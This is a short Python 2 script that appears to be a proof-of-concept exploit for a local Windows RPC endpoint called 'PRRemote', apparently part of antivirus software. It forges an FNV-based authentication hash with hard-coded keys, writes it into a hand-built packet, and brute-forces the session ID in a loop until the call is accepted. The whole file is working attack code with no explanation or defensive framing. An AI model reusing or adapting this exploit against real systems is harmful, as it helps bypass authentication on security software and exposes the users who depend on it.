import windows.rpc
from windows.rpc import ndr
import sys,struct,binascii
import random
import time
from fnv_hash import *


session0=0xfffa783c
session1=0x179a7b
key0=0x13371337
key1=0xdeadbeef

print "%08X %08X %08X %08X" % (session0, session1, key0, key1)
    
fnv=FNV_hash()

fnv.set_key(struct.pack("<I",key0),struct.pack("<I",key1))
fnv.set_sid(struct.pack("<I",0xfffa783b),struct.pack("<I",session1))
fnv.set_payload("00".decode('hex'))
fnv.set_msgid('0000000000000000'.decode('hex'))
res1,res0=fnv.run()

print hex(res0),hex(res1)

# With msgid: 67462FF6ECBDD301
# pkt=[0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00320101, 0x00000001, 0xFFFA783B, 0x0074FD38, 0x51930001, 0xEA0A1587, 0x46672882, 0xBDECF62F, 0x000001D3, 0x00000000, 0x00D50000, 0x00010000, 0x00190000, 0x00000000, 0x00000000, 0x000000C3, 0x00000001, 0xEA8F0100, 0x147ACDED, 0x81000000, 0x03000302, 0x00000000, 0xE9817096, 0xB1CFBDEF, 0x02678CBD, 0x00000091, 0x780E8100, 0x32003300, 0x62006400, 0x20006700, 0x20002D00, 0x69004600, 0x65006C00, 0x20003A00, 0x76006100, 0x2E007000, 0x78006500, 0x20006500, 0x20002D00, 0x49005000, 0x3A004400, 0x36002000, 0x30003400, 0x2D002000, 0x4D002000, 0x64006F00, 0x6C007500, 0x3A006500, 0x70002000, 0x72007200, 0x6D006500, 0x74006F00, 0x2E006500, 0x6C006400, 0x20006C00, 0x20002D00, 0x68005400, 0x7FFFFFFF]

pkt=[0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00320101, 0x00000001, 0xFFFA783B, 0x0074FD38, 0x51930001, 0xEA0A1587, 0x00002882, 0x00000000, 0x00000000, 0x00000000, 0x00D50000, 0x00010000, 0x00190000, 0x00000000, 0x00000000, 0x000000C3, 0x00000001, 0xEA8F0100, 0x147ACDED, 0x81000000, 0x03000302, 0x00000000, 0xE9817096, 0xB1CFBDEF, 0x02678CBD, 0x00000091, 0x780E8100, 0x32003300, 0x62006400, 0x20006700, 0x20002D00, 0x69004600, 0x65006C00, 0x20003A00, 0x76006100, 0x2E007000, 0x78006500, 0x20006500, 0x20002D00, 0x49005000, 0x3A004400, 0x36002000, 0x30003400, 0x2D002000, 0x4D002000, 0x64006F00, 0x6C007500, 0x3A006500, 0x70002000, 0x72007200, 0x6D006500, 0x74006F00, 0x2E006500, 0x6C006400, 0x20006C00, 0x20002D00, 0x68005400, 0x7FFFFFFF]
    

pkt[6]=session0
pkt[7]=session1

pkt[8] = (pkt[8] & 0x0000ffff) | ((res0 & 0x0000ffff) << 16)
pkt[9] = (pkt[9] & 0xffff0000) | ((res0 & 0xffff0000) >> 16)
pkt[9] = (pkt[9] & 0x0000ffff) | ((res1 & 0x0000ffff) << 16)
pkt[10] = (pkt[10] & 0xffff0000) | ((res1 &0xffff0000) >> 16)

while True:
    try:
        client = windows.rpc.RPCClient(r"\RPC Control\PRRemote:%d" % int(sys.argv[1]) )
        iid = client.bind("806411e0-2ed2-194f-bb8c-e27194948ac1")
        ndr_params = ndr.make_parameters([ndr.NdrLong]*len(pkt))
        resp = client.call(iid, 4, ndr_params.pack(pkt))
        print repr(resp)
    except ValueError as e:
        print str(e)
        print "xxxxxx"
        if "RPC Response error" in str(e):
            pkt[6]+=1
            print "Trying %08x" % pkt[6]
        else:
            raise e
